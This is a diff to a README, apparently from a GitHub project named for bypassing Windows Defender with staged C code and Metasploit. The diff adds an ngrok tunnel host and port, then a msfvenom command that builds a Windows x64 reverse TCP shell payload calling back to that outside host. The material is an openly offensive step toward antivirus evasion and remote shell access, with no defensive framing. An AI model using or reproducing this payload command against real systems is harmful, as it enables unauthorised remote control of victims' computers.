@@ -22,10 +22,15 @@ Bypass Windows Defender with a staged C code &amp; metasploit framework
   ```
 - Copy the IP and the PORT of the server -
   ```
-   -
-   - 
+   - IP: 4.tcp.eu.ngrok.io
+   - PORT: 15819
   ```
 
 <p align="center">
     <img src="https://github.com/HaxL0p4/Bypass-Windows-Defender/blob/main/ngrok-tcp.jpg">
    </p>
+
+- Create the .bin payload using msfvenom -
+  ```
+   - msfvenom -p windows/x64/shell_reverse_tcp LHOST=4.tcp.eu.ngrok.io LPORT=15819 -f raw -o payload.bin
+  ``
